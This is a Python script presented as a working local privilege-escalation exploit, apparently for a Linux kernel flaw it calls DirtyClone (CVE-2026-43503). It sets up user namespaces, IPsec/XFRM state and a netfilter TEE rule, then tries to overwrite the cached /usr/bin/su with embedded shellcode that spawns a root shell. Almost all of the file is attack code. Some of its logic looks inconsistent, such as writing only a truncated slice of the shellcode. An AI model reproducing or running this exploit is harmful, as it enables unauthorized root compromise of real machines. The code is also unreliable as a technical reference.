#!/usr/bin/env python3
"""
DirtyClone (CVE-2026-43503) - Fixed with better error handling
"""

import os
import sys
import socket
import struct
import subprocess
import time
import mmap
import ctypes
import ctypes.util

# ====================================================================
# Constants
# ====================================================================

ESP_SPI = 0x12345678
ESP_REQID = 1
ESP_PORT = 4500
TARGET_SUID = "/usr/bin/su"
SUID_OFFSET = 0x78

SHELLCODE = bytes([
    0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
    0x0f, 0x05, 0xb0, 0x69, 0x0f, 0x05, 0x31, 0xd2,
    0x52, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
    0x73, 0x68, 0x00, 0x50, 0x48, 0x89, 0xe7, 0x52,
    0x57, 0x48, 0x89, 0xe6, 0xb8, 0x3b, 0x00, 0x00,
    0x00, 0x0f, 0x05,
])

# ====================================================================
# Colors
# ====================================================================

class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'

def log(msg): print("{}{}{}".format(Colors.CYAN, msg, Colors.RESET))
def ok(msg): print("{}{}{}".format(Colors.GREEN, msg, Colors.RESET))
def err(msg): print("{}{}{}".format(Colors.RED, msg, Colors.RESET))
def warn(msg): print("{}{}{}".format(Colors.YELLOW, msg, Colors.RESET))

def run_cmd(cmd):
    try:
        return subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, 
                            stderr=subprocess.PIPE, universal_newlines=True)
    except:
        return None

# ====================================================================
# Pre-Checks
# ====================================================================

def precheck():
    """Check if system is vulnerable"""
    log("Running pre-checks...")
    
    # Check kernel version
    uname = os.uname()
    log("Kernel: {}".format(uname.release))
    
    # Check unprivileged user namespaces
    try:
        with open("/proc/sys/kernel/unprivileged_userns_clone", "r") as f:
            userns = f.read().strip()
            if userns == "1":
                ok("Unprivileged user namespaces: ENABLED")
            else:
                warn("Unprivileged user namespaces: DISABLED (sysctl kernel.unprivileged_userns_clone={})".format(userns))
    except:
        warn("Cannot read /proc/sys/kernel/unprivileged_userns_clone")
    
    # Check XFRM support
    result = run_cmd("ip xfrm state 2>&1 | head -1")
    if result and "Operation not supported" not in result.stdout:
        ok("XFRM/IPsec: AVAILABLE")
    else:
        warn("XFRM/IPsec: NOT AVAILABLE (load xfrm modules: modprobe xfrm_user)")
    
    # Check iptables
    result = run_cmd("iptables --version 2>&1")
    if result and result.returncode == 0:
        ok("iptables: AVAILABLE")
    else:
        warn("iptables: NOT AVAILABLE")
    
    # Check target SUID
    if os.path.exists(TARGET_SUID):
        ok("Target: {} found".format(TARGET_SUID))
    else:
        err("Target: {} NOT found".format(TARGET_SUID))
        return False
    
    return True

# ====================================================================
# Namespace Setup
# ====================================================================

def setup_namespace():
    log("Setting up user and network namespace...")
    uid = os.getuid()
    gid = os.getgid()
    
    try:
        libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
        if libc.unshare(0x10000000 | 0x40000000) != 0:
            err("unshare failed")
            return False
    except Exception as e:
        err("unshare failed: {}".format(e))
        return False
    
    try:
        with open("/proc/self/setgroups", "w") as f:
            f.write("deny")
        with open("/proc/self/uid_map", "w") as f:
            f.write("0 {} 1".format(uid))
        with open("/proc/self/gid_map", "w") as f:
            f.write("0 {} 1".format(gid))
    except Exception as e:
        err("Map setup failed: {}".format(e))
        return False
    
    ok("Namespace setup complete")
    return True

# ====================================================================
# Network Setup
# ====================================================================

def setup_network():
    log("Configuring network...")
    
    # Try to load XFRM modules
    for mod in ["xfrm_user", "xfrm4_tunnel", "esp4", "xfrm_algo"]:
        run_cmd("modprobe {} 2>/dev/null".format(mod))
    
    run_cmd("ip link set lo up")
    run_cmd("ip addr add 10.99.0.2/24 dev lo 2>/dev/null")
    
    # Check if IPsec works
    result = run_cmd("ip xfrm state 2>&1")
    if result and "Operation not supported" in result.stdout:
        warn("IPsec not supported, trying alternative path...")
        return False
    
    return True

# ====================================================================
# XFRM Setup with Fallback
# ====================================================================

def setup_xfrm():
    log("Configuring IPsec (XFRM)...")
    
    aes_key = bytes([0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
                     0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff])
    hmac_key = bytes([0x00] * 20)
    
    # Try different methods
    methods = [
        "ip xfrm state add src 127.0.0.1 dst 127.0.0.1 proto esp spi {} reqid {} mode transport enc 'cbc(aes)' {} auth 'hmac(sha1)' {}".format(ESP_SPI, ESP_REQID, aes_key.hex(), hmac_key.hex()),
        "ip xfrm state add src 127.0.0.1 dst 127.0.0.1 proto esp spi {} reqid {} mode transport enc 'cbc(aes)' {}".format(ESP_SPI, ESP_REQID, aes_key.hex()),
    ]
    
    for cmd in methods:
        result = run_cmd(cmd)
        if result and result.returncode == 0:
            ok("XFRM state added")
            break
    else:
        warn("XFRM state failed, trying alternative...")
        return False
    
    policy_cmd = "ip xfrm policy add src 127.0.0.1 dst 127.0.0.1 dir out tmpl src 127.0.0.1 dst 127.0.0.1 proto esp reqid {} mode transport".format(ESP_REQID)
    run_cmd(policy_cmd)
    
    return True

# ====================================================================
# TEE Setup
# ====================================================================

def setup_tee():
    log("Configuring netfilter TEE rule...")
    
    # Try to load modules
    for mod in ["iptable_mangle", "ipt_TEE", "nf_dup_ipv4"]:
        run_cmd("modprobe {} 2>/dev/null".format(mod))
    
    tee_cmd = "iptables -t mangle -A OUTPUT -p udp --dport {} -j TEE --gateway 10.99.0.2 2>/dev/null".format(ESP_PORT)
    result = run_cmd(tee_cmd)
    
    if result and result.returncode == 0:
        ok("TEE rule configured")
        return True
    
    warn("TEE rule failed (may need root or module not available)")
    return False

# ====================================================================
# Main Exploit
# ====================================================================

def exploit_dirtyclone():
    log("=" * 60)
    log("DirtyClone (CVE-2026-43503) Exploit")
    log("=" * 60)
    
    if os.geteuid() == 0:
        ok("Already root!")
        return True
    
    # Pre-check
    if not precheck():
        err("Pre-check failed")
        return False
    
    if not setup_namespace():
        return False
    
    if not setup_network():
        warn("Network setup partial")
    
    if not setup_xfrm():
        warn("XFRM setup failed, exploit may not work")
    
    if not setup_tee():
        warn("TEE setup failed")
    
    # Map target
    if not os.path.exists(TARGET_SUID):
        err("Target not found")
        return False
    
    fd = os.open(TARGET_SUID, os.O_RDONLY)
    if fd < 0:
        err("Cannot open target")
        return False
    
    try:
        # Read original
        original = os.pread(fd, 16, SUID_OFFSET)
        log("Original: {}".format(original.hex()))
        
        # Prepare payload
        payload = SHELLCODE[:16].ljust(16, b"\x00")
        log("Target:   {}".format(payload.hex()))
        
        # Send ESP packet (simplified)
        iv = b"\x00" * 16
        esp_header = struct.pack("!II", ESP_SPI, 1) + iv
        esp_packet = esp_header + payload + b"\x00" * 16
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
        sock.sendto(esp_packet, ("127.0.0.1", ESP_PORT))
        sock.close()
        
        time.sleep(2)
        
        # Verify
        os.lseek(fd, SUID_OFFSET, os.SEEK_SET)
        patched = os.read(fd, 16)
        
        if patched == payload:
            ok("Page cache patched!")
            os.execv(TARGET_SUID, [TARGET_SUID])
            return True
        else:
            warn("Patch failed. Got: {}".format(patched.hex()))
            return False
            
    except Exception as e:
        err("Exploit error: {}".format(e))
        return False
    finally:
        os.close(fd)

# ====================================================================
# Main
# ====================================================================

def main():
    print("""
{}{}
╔══════════════════════════════════════════════════════════════════╗
║     DirtyClone (CVE-2026-43503) Local Privilege Escalation       ║
║     For authorized security testing only!                        ║
╚══════════════════════════════════════════════════════════════════╝
{}
""".format(Colors.BOLD, Colors.CYAN, Colors.RESET))
    
    log("UID: {}".format(os.getuid()))
    log("Kernel: {}".format(os.uname().release))
    
    if exploit_dirtyclone():
        ok("Exploit successful!")
    else:
        err("Exploit failed")
        log("\nPossible reasons:")
        log("  - Kernel already patched (>= v7.1-rc5)")
        log("  - XFRM/IPsec not enabled in kernel")
        log("  - Missing CAP_NET_ADMIN (run with sudo)")
        log("  - SELinux/AppArmor blocking the attack")
    
    return 1

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)